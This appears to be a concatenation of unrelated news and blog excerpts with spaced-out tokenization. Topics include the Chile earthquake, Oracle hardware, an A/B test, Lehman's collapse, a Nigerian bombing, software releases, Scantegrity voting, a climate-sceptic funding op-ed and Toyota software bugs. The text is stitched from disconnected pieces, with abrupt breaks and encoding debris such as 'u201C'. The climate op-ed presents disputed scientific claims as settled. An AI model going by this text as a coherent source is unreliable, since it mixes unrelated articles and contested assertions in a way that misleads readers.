But if the worst happens and no preparations have been made … everything is lost .
The life - threatening element of the quake was past , but not the threat to life .
In the few minutes it took Celente and Abatelli to make it downstairs , out into the street and back to the hotel lobby entrance , wolf - packs of screaming young men materialized , seemingly out of nowhere , even though it was 4 AM .
Rampaging through the streets , they bowled over and mugged anyone unlucky enough to get in their path .
Police were nowhere to be seen .
Trends 2000 Gerald Celente Best Price : $ 1.79 Buy New $ 10.90 ( as of 03:15 EST - Details )
Out of harm ’s way for the moment , the next priority for Celente and Abatelli was finding a way out of Chile .
The devastation was vast and the airport shut down .
It was obvious that any sort of cleanup , to say nothing of repair and a restoration of services , would be slow to come .
u201CCommunal spirit intelligently deployed is the core value of ‘ Neo - Survivalism .
’u201D
Abatelli ’s laptop was working and an email was fired off to John Perkins , their close - combat mentor back in NY .
Immediately , Perkins sent out an SOS to his worldwide list of martial arts practitioners .
Within hours , advice was streaming in through a far - flung web of primary … then secondary and tertiary sources .
There were names and phone numbers of high - level Embassy officials ; personal contacts in Chile and Argentina ready to help with funds and lodging .
Among the dozens of suggestions , one held the promise of immediate escape : hire a car and driver to take them to Mendoza , Argentina , a ten hour drive from Santiago .
From there they could fly to Buenos Aires and in fact were actually able despite other unforeseen complications to catch their scheduled flight back to New York .
The u201CNeo - Survivalismu201D principles carefully developed by The Trends Research Institute had been put into action and passed a crucial test .
While the odds of being caught up in another major earthquake may be remote , analogous crises are not only possible , but probable in the near future .
We foresaw u201CNeo - Survivalismu201D as a Top Trend for 2010 , because in these critical times a range of socioeconomic calamities and geopolitical upheavals will require individual and collective responses beyond any government ’s ability to address .
Terror attacks , economic meltdowns , crime waves , food shortages , infrastructure - disrupting cyber attacks , extended power outages and wars are all possibilities that the u201 Con - trendu201D should be preparing for .

Oracle acquired Sun Microsystems in 2010 , and since that time Oracle 's hardware and software engineers have worked side - by - side to build fully integrated systems and optimized solutions designed to achieve performance levels that are unmatched in the industry .
Early examples include the Oracle Exadata Database Machine X2 - 8 , and the first Oracle Exalogic Elastic Cloud , both introduced in late 2010 .
During 2011 , Oracle introduced the SPARC SuperCluster T4 - 4 , a general - purpose , engineered system with Oracle Solaris that delivered record - breaking performance on a series of enterprise benchmarks .
Oracle 's SPARC - based systems are some of the most scalable , reliable , and secure products available today .
Sun 's prized software portfolio has continued to develop as well , with new releases of Oracle Solaris , MySQL , and the recent introduction of Java 7 .
Oracle invests in innovation by designing hardware and software systems that are engineered to work together .
Periodically , news of an innovative , goofy , compelling , or compellingly goofy design decision will sweep across the Internets like wildfire .
Most recently , this happened with a madlibs - looking lead generation form .
I think it has much to recommend it in the context of lead generation forms ( long , arduous monstrosity that you sign up for in the hopes you are contacted but not spammed to death ) , but I did n’t see much possible upside for using it on a new user registration form ( short form which you sign up to use something ) .
However , I ’m wary of trusting my instincts on such things when I could trust data instead .
There is a key point about A/ B testing : trust your data , not somebody else ’s data .
After all , you only make money when it improves your conversion rate , not their conversion rate .
You can feel free to use other folk ’s successful experiments for inspiration but for heaven ’s sake use them to inspire you to run tests , rather than inspire you to fire blindly .
I was particularly wary about trusting this result because , as pointed out by numerous people in the Hacker News discussion , roughly seven things changed between the two forms in the A/B test performed on the standard form versus the madlib form , and there is no particular reason to assume that the salient difference was caused by the part which strikes us as creative as opposed by more boring things like e.g. the call to action in the header .
When In Doubt , Test .
( When Not In Doubt , Test Twice . )
No less than six people said “ Hey Patrick have you seen this madlibs thing yet ?
You ’ve got to try it . ” , and because knocking something together would take less than 10 minutes because I have an A/ B testing framework that makes this a one - line proposition , I decided I ’d humor them .
I isolated just the madlibs versus standard style for the test , knocked up an alternative in about ten minutes with my ( decidedly limited ) CSS and Javascript skills , and set them against each other .
My conversion goal for this test is successfully inducing someone to sign up for the free trial of Bingo Card Creator .
My Usual Registration Form
The Madlibs Registration Form
P.S. If you have good eyes you ’ll spot the other A/B test ongoing on this page .
I ’m using the traditional way of mitigating cross-test interaction … ignoring the possibility of it .
Do n’t tell your college stats professor , but this actually works pretty well in practice .
Results
I ran this test until A / Bingo , my A/B testing framework for Rails , told me that further testing was just a waste of my time .
It did n’t take long at all — 34 hours after the test alternative went live for the site , the first time I checked the results , they were already overwhelming .
Let me copy / paste right off my public results page :
Signup Madlibs Versus Standard Standard ( 27.55 % ) winner
Madlibs ( 21.73 % ) 95 %
By my count that is a 22 % decrease in conversion rates for using the madlibs signup style over the standard signups style , and the fact of the decrease ( but not the magnitude ) is significant at the 95 % confidence level .
For the curious : there were 736 participants in this test , split roughly 50 /50 , as you would expect .
I love the Internet because where else can you get 736 people to help you improve your website while you sleep , work at the day job on Saturday , have an evening out with friends , and then sleep some more ?
Anyhow : test ended , not touching the madlibs idea again .
Before adopting this or any other fad ( or good suggestion , for that matter ) : do your own A /B tests .
UPDATE : To address the public health crisis posed by COVID - 19 and the office closures that have come along with it , we ’ve been working on partnerships to create and distribute meals for those who need them , but without our regular fee - for - service model , we could use your help !

LOS ANGELES ( MarketWatch ) -- Bankrupt financial giant Lehman Bros. ' former top officers , its auditor and several rival brokers could face legal claims , a court - appointed examiner said in a report released Thursday .
In a 2,200 - page report , examiner Anton Valukas said that while Lehman 's directors at the time of the collapse were n't necessarily responsible , some of its top executive management might be held liable , according to reports of the findings .
Lehman is currently undergoing court - supervised liquidation to pay off creditors .
Valukas mentioned ex-Chief Executive Dick Fuld and chief financial officers Chris O'Meara , Erin Callan and Ian Lowitt as possibly facing claims for negligence or breach of duty .
The report cited a practice known internally as " Repo 105 , " in which Lehman allegedly used repurchase agreements -- the temporary exchange of assets for cash -- that were structured as sales so that the leverage could be moved off the firm 's balance sheet .
See story on Lehman 's accounting " drug " Repo 105 .
As a result , the report says , Lehman may have already been insolvent on Sept. 2 , 2008 , almost two weeks before its Sept. 15 bankruptcy filing rocked the financial world and helped send the stock market into a nosedive .
" In this way , unbeknownst to the investing public , rating agencies , government regulators , and Lehman 's board of directors , Lehman reverse engineered the firm 's net leverage ratio for public consumption , " the report said .
A Reuters report quoted an attorney representing Fuld as saying the former CEO " did not know what those transactions were " and that " he did n't structure them or negotiate them , nor was he aware of their accounting treatment . "
The Valukas report also said evidence exists to support a professional malpractice claim against Lehman auditor Ernst & Young , as the firm " took no steps to question or challenge the non-disclosure by Lehman of its use of $ 50 billion of temporary , off - balance sheet transactions , " according to the Journal .
" Lehman 's bankruptcy , which occurred in September 2008 , was the result of a series of unprecedented adverse events in the financial markets , " Ernst & Young spokesman Charles Perkins said in a statement that was emailed to MarketWatch .
" Our last audit of the Company was for the fiscal year ending November 30 , 2007 .
Our opinion indicated that Lehman 's financial statements for that year were fairly presented in accordance with Generally Accepted Accounting Principles ( GAAP ) , and we remain of that view . "
" After an exhaustive investigation the Examiner made no findings in his report that Lehman 's assets or liabilities were improperly valued or accounted for incorrectly in Lehman 's November 30 , 2007 financial statements , " Perkins added .
Valukas also suggested claims might be possible against some Lehman 's competitors , including J.P. Morgan Chase & Co. JPM , +0.96 % and Citigroup Inc. C , +1.62 % , particularly for demands of about $ 16 billion in collateral as Lehman began to fall apart .
The report cites , for example , a Sept. 11 call by J.P. Morgan for $ 5 billion .
Read the report here .
A J.P. Morgan spokesman declined to comment .
" Citi is reviewing the Report , which is over 2000 pages long , but notes that , based on its preliminary review , the Examiner has not identified any wrongdoing on Citi 's part , " a Citigroup spokeswoman said in an emailed statement .
I can imagine a world in which gender difference did not translate into gender inequality … a world in which feminized tasks — nurturing others , creating beautiful and comfortable homes , cooking delicious , nutritious meals , and adorning oneself for the pleasure of oneself and others — were actually valued and , importantly , both respected and compensated in ways that reflected that value .
But alas .
We do n’t live in a world in which gender difference co-exists with gender equality .
We live in a world in which boys go to the moon ; and girls are princesses …
… at least , according to these “ cookie pans ” sent in by both Ash and Karen A. :
Many of the rebel groups have now laid down their weapons
Two car bombs have been set off in the Nigerian oil city of Warri , where officials were in talks over an amnesty for militants in the area .
Witnesses said the explosions shattered windows at the state governor 's office and sent officials fleeing for cover .
The militant group Movement for the Emancipation of the Niger Delta ( Mend ) had issued a bomb threat earlier .
Several armed groups recently agreed to an amnesty , but some Mend leaders rejected the government 's offer .
A Mend leader announced in January that a temporary ceasefire was over .
Militant condemnation
In Warri , witnesses reported seeing huge plumes of smoke rising into the air .
There were no reports of injuries .
" There were car bombs - two of them , " Delta State government spokesman Linus Chima told AFP news agency .
" The first one exploded just as the governors came in and the second one was about 30 minutes later . "
" I think the intention is obvious , just to scuttle the talks and make it seem as if Warri in Delta State is not safe . "
The BBC's Caroline Duffield in Lagos says the use of car bombs is a significant change in tactics from Mend .
She says it is not clear how many of the group 's top commanders are behind this attack .
A source close to Government Tompolo , a leading Mend figure , told the BBC that he condemned the attack : '' This came as a surprise to us .
We had no prior knowledge of this .
'' We are calling on the security services to arrest those behind it . ''
For years , armed groups have caused havoc in the oil - rich Niger Delta , abducting oil workers and sabotaging pipelines .
They claim they are fighting for a fairer share of oil wealth for local people .
But their critics say they use the money they get from illegal oil sales and ransoms to buy weapons and fund more militant activities .

Palapeli : Visual changelog for today March 29 , 2010
Nothing happened in Palapeli land since the 1.0 release together with KDE SC 4.4 .
The wishlist was slowly growing , but today I ’ve started to implement some smaller items on the todolist .
The big ones ( GHNS integration , puzzle piles and rotateable pieces ) are still left , but now I present you the first new features that will appear in Palapeli 1.1 ( KDE SC 4.5 ) :
This screenshot shows two closed wishlist items : Instead of a background texture , one can now also select a solid color .
Also , the puzzle name is displayed in the window title .
( The code is a one - liner , which I unfortunately forgot to add before the 4.4 feature freeze . )
It is now possible to select multiple pieces at once , either by holding Ctrl and clicking on the pieces , or by dragging a rubberband around the pieces .
All pieces will then be moved at once when you drag one of them .
The selection state is indicated by a colored shadow ( according to the color scheme ) , which might be hard to recognize in this screenshot because the rubberband has nearly the same color .
According to Eater National , local talent Top Cheffer from Season 2 , Marcel Viegneron , will star in a new reality show on the SyFy network .
This might seem like an odd bit of programming for a network whose most popular show is Battlestar Galactica , but keep in mind that Marcel 's cooking style incorporates molecular gastronomy , which is of course is the cuisine of choice for space - nerds .
The new show , Marcel 's Quantum Kitchen , will be a documentary style account of the meals prepared by Vigneron 's catering company .
For the first set of episodes , Marcel and Co. will create avant garde cuisine for a goth rock fashion show , the ribbon cutting for a subway line , and a Renn - Fair - themed graduation ceremony .
Last month came word that Marcel had been tapped as the chef at the Beverly Hilton Hotel 's Bar210 and Push , where he was preparing a menu of small plate " Modern Global Tastings . "
No word yet on whether the catering company be run out of the club , or if this is a new business that was just cooked up for the show .

Last month , when 30 Republican senators signed on as corporate sponsors of rape , the Democratic Senatorial Campaign Committee ( DSCC ) was handed an extremely potent line of attack to use during next year 's elections .
And what 's the response from the GOP on being called out for their disgusting actions ?
Privately , GOP sources acknowledge that they failed to anticipate the political consequences of a “ no ” vote on the amendment .
Seriously ?
They voted against an amendment that was prompted by the brutal gang - rape of a young woman by her co-workers while she was working for a company under contract for the United States government , after which she was locked in a shipping container without food or water , threatened if she left to seek medical treatment , and was then prevented from bringing criminal charges against her assailants .
And they failed to anticipate the political consequences ?
Boy , are they stupid ( among other , less flattering things ) .
And now they are kicking themselves for that stupidity -- no , not because they showed an utter lack of sensitivity , decency , humanity , or sense of justice -- but because they should n't have :
... agreed to a roll - call vote on the measure , rather than a simple voice vote that would have allowed the opposing senators to duck criticism .
Yes , that was the problem with their vote .
It was public .
Sports like aqua aerobics can help prevent weight gain
The recommended half an hour of exercise a day may not be enough to stop weight gain .
According to a US study of 34,000 women , an hour a day of moderate exercise is needed to fight the flab .
Overweight women need to diet as well as exercise , a Harvard team reports in the Journal of the American Medical Association .
The UK government advises adults to exercise for at least half an hour five or more days a week .
While 30 minutes exercise is recommended for health reasons , people need to exercise for longer to avoid weight gain
Professor Paul Gately , Leeds Metropolitan University
The US study followed 34,000 middle - aged women over 13 years .
The women completed regular questionnaires about the amount of time they spent on physical activity .
They were classified into three groups : those who did the equivalent of less than two and a half hours of moderate exercise a week , between two and a half hours and seven hours a week , and more than seven hours a week .
The average age of the women was 54 , and the average weight gain was 2.6 kg over the 13 year period .
The high exercise group gained significantly less weight than the rest .
But there was no difference in weight gain between the two lower exercise groups .
The only group who did n't gain weight during the study were normal weight women who exercised for an hour or more a day .
Too late Among the women who were normal weight at the start , the more they exercised , the less weight they gained .
But among those who were already overweight at the start there was no relation between exercise and weight gain .
The authors say clear guidelines on the amount of physical activity for the prevention of weight gain are essential .
They draw two conclusions : " Firstly once overweight , it may be too late because physical activity - at least , at levels carried out by study participants - was not associated with less weight gain .
" Second , sustaining high levels of physical activity ( 60 minutes a day ) is needed to successfully maintain normal BMI and prevent weight gain . "
This level of activity is higher than the minimum that the UK government recommends .
Spare tyre A Department of Health spokesperson said : " The Chief Medical Officer recommends that adults do 30 minutes of physical activity at least five times a week .
Children need 60 minutes of activity every day .
" As part of the Change4 Life movement , adults are being encouraged to make simple changes , such as eating more fruit and veg , cutting down on fatty foods and being more active , in their diet and lifestyle which will help them lead longer , healthier lives  and lose that unwanted spare tyre . "
But Professor Paul Gately , who runs Carnegie Weight Management Programme at Leeds Metropolitan University , said the government recommendation is the amount of exercise needed to reduce risk of ill health .
He said more exercise was needed to avoid weight gain , and an hour a day was in line with findings of previous research .
He said : " While 30 minutes exercise is recommended for health reasons , people need to exercise for longer to avoid weight gain . "
He added that the International Obesity Task Force report in 2004 concluded that people who are overweight have to do more exercise to maintain their weight , up to 90 minutes a day .

The Way Life Is - A Webcomic
Last week , in Takoma Park , Md. , a new cryptographic voting system that ensures accurate vote counts was used for the first time in a real election .
A general description of how the system performed on Election Day is here ; this article provides more details about how the system actually works .
Called Scantegrity
II , the system is a variation on conventional optical - scan voting .
But instead of filling in a bubble next to a candidate ’s name , the voter uses a special pen that exposes a code printed inside the bubble in invisible ink .
A voter can write down that code , along with the serial number of her ballot , to later verify the results online .
She can’t , however , offer a would - be vote buyer proof that she selected a particular candidate , since the code is n’t associated with the candidate ’s name .
If enough people confirm their codes — about 2 percent of voters — it ’s almost impossible for vote tampering to go undetected .
The key to the system is that before the election , the election commission prepares a set of tables that link the ballot codes and the candidates ’ names .
Then , it publicly releases a set of digital signatures that cryptographically describe all the entries in the tables without actually revealing them .
That way , the tables ca n’t be tampered with after the ballots are cast , but neither do they reveal any information that ballot stuffers could use before the election .
In the Takoma Park election , the election commission used 20 distinct sets of tables , with three tables in each set .
In each set , the first table listed the codes printed on each ballot .
The codes were listed in a random order to make it impossible to tell which code was associated with which candidate .
The third table featured only the candidates ’ names at the top — it was simply a grid for recording the votes assigned to each candidate .
The second table mapped each code in the first table to a unique slot in the third table .
This second table ensured that the slot fell under the right candidate ’s name , but the mapping was otherwise random to make it impossible to tell from a slot ’s location which ballot it corresponded to .
After the election , for each of the 20 sets of tables , the election commission web site posted the final tally using the grid in table three .
It released the codes in table one that were actually exposed in the voting booth , along with encryption keys that verified their authenticity .
And it randomly released half of the information in table two : either the half that pointed backward , to the codes in table one , or the half that pointed forward , to the slots in table three .
Finally , it flagged all the entries in table two correlated with recorded votes — with exposed codes in table one and slots checked in table three .
Exposing only half of table two preserves voter anonymity :
There ’s no way to figure out which ballot went for which candidate .
But it also provides enough information that any attempt to tamper with the results can be detected .
To change the final tally , a ballot stuffer would have to insert fake votes into table three .
But that would entail spuriously flagging the corresponding entry in table two .
And that would entail revealing the corresponding code in table one — which a voter who checked her code online would notice .
Think that this spring ’s “ Robin Hood ” movie will be a blockbuster at the box office ?
Next week you will be able to put your money on it .
Cantor Futures Exchange , a subsidiary of Cantor Fitzgerald , expects to open an online futures market next month that will allow studios , institutions and moviegoers to place bets on the box - office revenue of Hollywood ’s biggest releases .
Last week , the company learned from regulators that customers could start putting money into their accounts on March 15 .
“ I ’ve worked in the futures industry for a long time , ” said Richard Jaycobs , the president of Cantor Exchange , who has worked with derivative markets and the cotton exchange .
“ And none of the products has the overall appeal that this does .
This just has a tremendous potential audience . ”
Betting on the success of Hollywood releases has long been a parlor game for moviegoers .
In 2001 , Cantor Fitzgerald bought the Web site HSX.com ( for “ Hollywood Stock Exchange ” ) , where users can place bets with play money on a film ’s box - office success ; smart traders win little more than satisfaction .
Mr. Jaycobs said that he hoped to lure a sizable portion of that site ’s 200,000 active users to the real futures exchange .

Yeah , finally , this marks the end of a rather long line of beta’s .
The first one is more than a year old !
But it also means we ’re finally getting closer to a 4.0 release .
Now its time to go through the open bugreports for KDevelop
and KDevPlatform .
Also make sure you read the dot story about the Hacksprint in Berlin with joint developer forces from Kate , KDevelop and Okteta .
Packages are available as usual on the KDE mirrors .
Make sure to get the latest one as I had to do a silent update on sunday evening ( forgot to increase the version numbers , really sorry ) , the md5sums are :
4b0b9bb343da46ead3ae9632a0bd9ce9 kdevelop-3.9.99.tar.bz2

The climate industry wall of money
This is the copy of the file I sent the ABC Drum Unleashed .
I ’m grateful they are allowing both sides of the story to get some airtime ( though Bob Carter ’s , and Marc Hendrickx ’s posts were both rejected .
Hat - tip to Louis and Marc ) .
Unfortunately the updated version I sent late yesterday which included some empirical references near the end was not posted until 4.30 pm EST .
( NB : The Australian spelling of skeptic is “ sceptic ” )
Somehow the tables have turned .
For all the smears of big money funding the “ deniers ” , the numbers reveal that the sceptics are actually the true grassroots campaigners , while Greenpeace defends Wall St. How times have changed .
Sceptics are fighting a billion dollar industry aligned with a trillion dollar trading scheme .
Big Oil ’s supposed evil influence has been vastly outdone by Big Government , and even those taxpayer billions are trumped by Big -Banking .
The big - money side of this debate has fostered a myth that sceptics write what they write because they are funded by oil profits .
They say , follow the money ?
So I did and it ’s chilling .
Greens and environmentalists need to be aware each time they smear with an ad hominem attack they are unwittingly helping giant finance houses .
Follow the money
Money for Sceptics : Greenpeace has searched for funding for sceptics and found $ 23 million dollars paid by Exxon over ten years ( which has stopped ) .
Perhaps Greenpeace missed funding from other fossil fuel companies , but you can be sure that they searched .
I wrote the Climate Money paper in July last year , and since then no one has claimed a larger figure .
Big - Oil may well prefer it if emissions are not traded , but it ’s not make - or - break for them .
If all fossil fuels are in effect “ taxed ” , consumers will pay the tax anyhow , and past price rises in crude oil suggest consumers will not consume much less fuel , so profits wo n’t actually fall that much .
But in the end , everyone spends more on carbon friendly initiatives than on sceptics– even Exxon : ( how about $ 100 million for Stanford ’s Global Climate and Energy Project , and $ 600 million for Biofuels research ) .
Some will complain that Exxon is massive and their green commitment was a tiny part of their profits , but the point is , what they spent on skeptics was even less .
Money for the Climate Industry : The US government spent $ 79 billion on climate research and technology since 1989 – to be sure , this funding paid for things like satellites and studies , but it ’s 3,500 times as much as anything offered to sceptics .
It buys a bandwagon of support , a repetitive rain of press releases , and includes PR departments of institutions like NOAA , NASA , the Climate Change Science Program and the Climate Change Technology Program .
The $ 79 billion figure does not include money from other western governments , private industry , and is not adjusted for inflation .
In other words , it could be …a lot bigger .
For direct PR comparisons though , just look at “ Think Climate Think Change “ : the Australian Government put $ 13.9 million into just one quick advertising campaign .
There is no question that there are vastly more financial rewards for people who promote a carbon - made catastrophe than for those who point out the flaws in the theory .
Ultimately the big problem is that there are no grants for scientists to demonstrate that carbon has little effect .
There are no Institutes of Natural Climate Change , but plenty that are devoted to UnNatural Forces .
It ’s a monopsony , and the main point is not that the scientists are necessarily corrupted by money or status ( though that appears to have happened to a few ) , but that there is no group or government seriously funding scientists to expose flaws .
The lack of systematic auditing of the IPCC , NOAA , NASA or East Anglia CRU , leaves a gaping vacuum .
It ’s possible that honest scientists have dutifully followed their grant applications , always looking for one thing in one direction , and when they have made flawed assumptions or errors , or just exaggerations , no one has pointed it out simply because everyone who could have , had a job doing something else .
In the end the auditors who volunteered — like Steve McIntyre and AnthonyWatts — are retired scientists , because they are the only ones who have the time and the expertise to do the hard work .
( Anyone fancy analysing statistical techniques in dendroclimatology or thermometer siting instead of playing a round of golf ? )
Money for the Finance Houses :
What the US Government has paid to one side of the scientific process pales in comparison with carbon trading .
According to the World Bank , turnover of carbon trading reached $ 126 billion in 2008 .
PointCarbon estimates trading in 2009 was about $ 130 billion .
This is turnover , not specifically profits , but each year the money market turnover eclipses the science funding over 20 years .
Money Talks .
Every major finance house stands to profit as brokers of a paper trade .
It does n’t matter whether you buy or sell , the bankers take a slice both ways .
The bigger the market , the more money they make shifting paper .
Banks want us to trade carbon …
Not surprisingly banks are doing what banks should do ( for their shareholders ) : they ’re following the promise of profits , and urging governments to adopt carbon trading .
7,8 Banks are keen to be seen as good corporate citizens ( look , there ’s an environmental banker ! ) , but somehow they do n’t find the idea of a non-tradable carbon tax as appealing as a trading scheme where financial middlemen can take a cut .
( For banks that believe in the carbon crisis , taxes may well “ help the planet , ” but they do n’t pay dividends . )
The stealthy mass entry of the bankers and traders poses a major force .
Surely if money has any effect on carbon emissions , it must also have an effect on careers , shareholders , advertising , and lobbying ?
There were over 2000 lobbyists in Washington in 2008 .
Unpaid sceptics are not just taking on scientists who conveniently secure grants and junkets for pursuing one theory , they also conflict with potential profits of Goldman Sachs , JP Morgan , BNP Paribas , Deutsche Bank , HSBC , Barclays , Morgan Stanley , and every other financial institution or corporation that stands to profit like the Chicago Climate Exchange , European Climate Exchange , PointCarbon , IdeaCarbon ( and the list goes on … ) as well as against government bureaucracies like the IPCC and multiple departments of Climate Change .
There ’s no conspiracy between these groups , just similar profit plans or power grabs .
Tony Abbot ’s new policy removes the benefits for bankers .
Labor and the Greens do n’t appear to notice that they fight tooth and nail for a market in a “ commodity ” which is n’t a commodity and that guarantees profits for big bankers .
The public though are figuring it out .
The largest tradeable “ commodity ” in the world ?
Commissioner Bart Chilton , head of the energy and environmental markets advisory committee of the Commodity Futures Trading Commission ( CFTC ) , has predicted that within five years a carbon market would dwarf any of the markets his agency currently regulates : “ I can see carbon trading being a $ 2 trillion market . ”
“ The largest commodity market in the world . ”
He ought to know .
It promises to be larger than the markets for coal , oil , gold , wheat , copper or uranium .
Just soak in that thought for a moment .
Larger than oil .
Richard L. Sandor , chairman and chief executive officer of Climate Exchange Plc , agrees and predicts trades eventually will total $ 10 trillion a year . ”
That ’s 10 thousand billion dollars .
Only the empirical evidence matters
Ultimately the atmosphere is what it is regardless of fiat currency movements .
Some people will accuse me of smearing climate scientists and making the same ad hominem attacks I detest and protest about .
So note carefully : I have n’t said that the massive amount of funding received by promoters of the Carbon Catastrophe proves that they are wrong , just as the grassroots unpaid dedication of sceptics does n’t prove them right either .
But the starkly lop - sided nature of the funding means we ’d be fools not to pay very close attention to the evidence .
It also shows how vapid the claims are from those who try to smear sceptics and who mistakenly think ad hominem arguments are worth making .
And as far as evidence goes , surprisingly , I agree with the IPCC that carbon dioxide warms the planet .
But few realize that the IPCC relies on feedback factors like humidity and clouds causing a major amplification of the minor CO2 effect and that this amplification simply is n’t there .
Hundreds of thousands of radiosonde measurements failed to find the pattern of upper trophospheric heating the models predicted , ( and neither Santer 2008 with his expanding “ uncertainties ” nor Sherwood 2008 with his wind gauges change that ) .
Other independent empirical observations indicate that the warming due to CO2 is halved by changes in the atmosphere , not amplified .
[ Spencer 2007 , Lindzen 2009 , see also Spencer 2008 ] .
Without this amplification from water vapor or clouds the infamous “ 3.5 degrees of warming ” collapses to just a half a degree — most of which has happened .
Those resorting to this vacuous , easily refutable point should be shamed into lifting their game .
The ad hominem argument is stone age reasoning , and the “ money ” insult they throw , bounces right back at them — a thousand - fold .

My reply to comments on the ABC post :
“ References for scientific assertions would make the argument on those points look … well , more scientific , no ? ”
Actually I advised the ABC when I sent them that draft that I was going to add references , which I sent late yesterday , but the final version has not been posted yet unfortunately .
I guess things were a little rushed presumably because they decided not to post Bob Carter ’s article .
I ’ve discussed many peer reviewed papers on my site .
As it is , I went 500 words over the recommended length .
Start here with the missing hot spot .
— — — — — — — — — —— ——
–
“ If you ’re going to argue that amplification from water vapour “ simply is n’t there ” , you have to explain why these empirically and theoretically based results are all wrong , or at the very least mean something other than they appear to .
“
Go look at the radiosonde graphs :
Squint hard and pretend that the graph of the data and the model predictions are really the same .
Radiosondes are calibrated to 0.1 of a degree .
They are looking for something much larger .
There ’s no hint it was found .
— — — — — — — —— —— ——
[ A commenter claims a NASA link shows the models were right ]
That NASA page refers to Dressler 2008 .
Spencer points out that Dressler focuses on only one part of the picture , and when Spencer studies the total SW and LW feedback his results showed negative feedback ( but that they would n’t publish Spencers more comprehensive work , even though the half - picture of Dressler was acceptable ) .
“ The other half of the feedback story which Dessler et al did not address is the reflected solar component .
This feedback is mostly controlled by changes in low cloud cover with warming .
The IPCC admits that feedbacks associated with low clouds are the most uncertain of all feedbacks , with positive or negative feedback possible … although most , if not all , IPCC models currently have positive SW feedbacks .
But I found from the CERES data a strongly negative SW feedback during 2002 - 2007 .
When added to the LW feedback , this resulted in a total ( SW+LW ) feedback that is strongly negative .
Is my work published ?
No…at least not yet …although I have tried . “
— — — — — — — —— ——
“ McIntyre ’s found nothing of significant consequence ”
McIntyre destroyed the hockey stick graph — feed in random data and get the same shape .
Hundreds upon hundreds of empirical studies show Mann was wrong as well .
— — — — — — — —— ——
–
“ It ’s a lovely irony that almost the entire piece argues that skeptical science is n’t getting funded .
And then it ends with …( unreferenced ) claims referring to ( presumably ) published scientific work that disagrees on some level with the current consensus .
You do n’t have to “ be paid ” to do published research ( though it ’s hard to get time for free at say , the large hadron collider ) .
McIntyre and McKitrick worked pro bono and were published for example .
I reference Lindzen and Spencer .
So there are still two sceptical scientists who have n’t been sacked yet and this somehow disproves my point about the imbalance in funding ?
List the grants specifically available for people who are looking to investigate non-carbon causes for the recent warming ?
But I can agree with Ms Nova on the broad point – more science is better than less .
Science after all proceeds through skepticism ( as distinct from what most AGW “ skeptics ” demonstrate ) .
I look forward to Ms Nova calling for more government funding of climate science , and I will gladly join in . ”
Yes , I want funding for climate science but not packaged in grants from a government department that would n’t exist if the results of the study go one way rather than the other .
Let ’s fund research into solar - magnetic effects on the climate , or the PDO ?
It would help our farmers far more than throwing more money at falsified models which work from the assumption that carbon is very influential .

There has been a lot of speculation recently that Toyota ’s problems with sudden acceleration may be caused by a problem in the vehicles ’ electronics systems .
The “ electronics ” includes millions of lines of software running on the automobiles ’ computers .
As The Times reported on March 3 , Toyota ’s chief engineer testified to Congress that the company has done extensive testing on its cars ’ electronics and believes they are not the cause of the sudden acceleration .
Having owned a Toyota myself , I have always been a fan of what I perceived to be the automaker ’s high standards for quality .
I also happen to have more than three decades of experience designing , building and researching reliable computer systems , many of which are embedded inside other devices .
Based on this experience , I find it very difficult to accept the statements from Toyota ’s chief engineer .
And the implications extend beyond Toyota , to all other companies that rely on software for their product safety .
As anyone with experience in embedded systems will tell you , there are nasty software bugs that can be extremely difficult to reproduce in a laboratory test environment .
To illustrate , I ’d like to describe one such bug we encountered at the Jet Propulsion Laboratory while developing the flight software for NASA ’s Mars Pathfinder spacecraft .
Because of Pathfinder ’s high reliability requirements and the probability of unpredictable hardware errors due to the increased radiation effects in space , we adopted a highly “ defensive ” programming style .
This included performing extensive error checks in the software to detect the possible side effects of radiation - induced hardware glitches and certain software bugs .
Advertisement
One member of our team , Steve Stolper , had a simple arithmetic computation in his software that was guaranteed to produce an even result ( 2 , 4 , 6 and so on ) if the computer was working correctly .
Many programmers would not bother to check the result of such a simple computation .
Stolper , however , put in an explicit test to see if the result was even .
We referred to this test as his “ two - plus - two - equals - five check . ”
We never expected to see it fail .
Lo and behold , during software testing we saw Stolper ’s error message indicating the check had failed .
We saw it just once .
We were never able to reproduce the failure , despite repeated attempts over many thousands if not millions of iterations .
We scratched our heads .
How could this happen , especially in the benign environment of our software test lab , where radiation effects were virtually nonexistent ?
We looked carefully at Stolper ’s code , and it was sound .
The only viable theory we could come up with was that an interrupt ( an external hardware stimulus such as a timer going off ) had occurred at just the right microsecond within the execution of Stolper ’s software .
Furthermore , we theorized , the operating system ( the equivalent of Windows on the flight computer ) had a bug that caused it to misremember whether an arithmetic carry had occurred just before the interrupt .
Although highly unlikely , it was the only credible explanation we could come up with .
Because this was a new version of the operating system built for Pathfinder , still not yet fully tested itself , this theory had some credibility .
We reviewed the operating system code and consulted with the company that developed it .
Much to our surprise ( and relief ) , we found that there was indeed a bug in the interrupt handling software as we had theorized .
If Stolper had not put in his “ two - plus - two - equals - five check , ” we might not have found the problem until it was too late -- that is , until it caused a catastrophic error en route to Mars .
( There were other subtle bugs that we found and fixed before and after launch , some arguably subtler than this one . )
Advertisement
So what ’s my point ?
First , I do n’t know if Toyota ’s engineers embrace the software reliability approaches we embraced on Pathfinder , which allowed us to catch these subtle bugs .
Second , even if the Toyota engineers do everything we did on Pathfinder and more , I ’m still skeptical when I hear an engineer declare a complex software system to be bug - free based on laboratory testing .
It is extremely difficult to make such a determination through laboratory tests .
I ’m quite certain none of the members of the Pathfinder software team would have declared the software to be bug - free prior to launch , despite our best efforts to make it so .
If Toyota has indeed tested its software as thoroughly as it says without finding any bugs , my response is simple : Keep trying .
Find new ways to instrument the software , and come up with more creative tests .
The odds are that there are still bugs in the code , which may or may not be related to unintended acceleration .
Until these bugs are identified , how can you be certain they are not related to sudden acceleration ?
My last point is this :
Whatever the final outcome of the Toyota saga , this should serve as a wake - up call to all industries that increasingly rely on software for safety .
It is probably only a matter of time before a software error results in injury or death , if it has not happened already ( there are some who say it has ) .
We need to minimize that possibility by enforcing extremely stringent standards on the development and testing of software in all safety - critical systems , including , but not limited to , automobiles .

Quite a few observers , including this blogger , have been stunned and frustrated at the refusal to investigate what was almost certain accounting fraud at Lehman .
Despite the bankruptcy administrator ’s effort to blame the gaping hole in Lehman ’s balance sheet on its disorderly collapse , the idea that the firm , which was by its own accounts solvent , would suddenly spring a roughly $ 130 + billion hole in its $ 660 balance sheet , is simply implausible on its face .
Indeed , it was such common knowledge in the Lehman flailing about period that Lehman ’s accounts were sus that Hank Paulson ’s recent book mentions repeatedly that Lehman ’s valuations were phony as if it were no big deal .
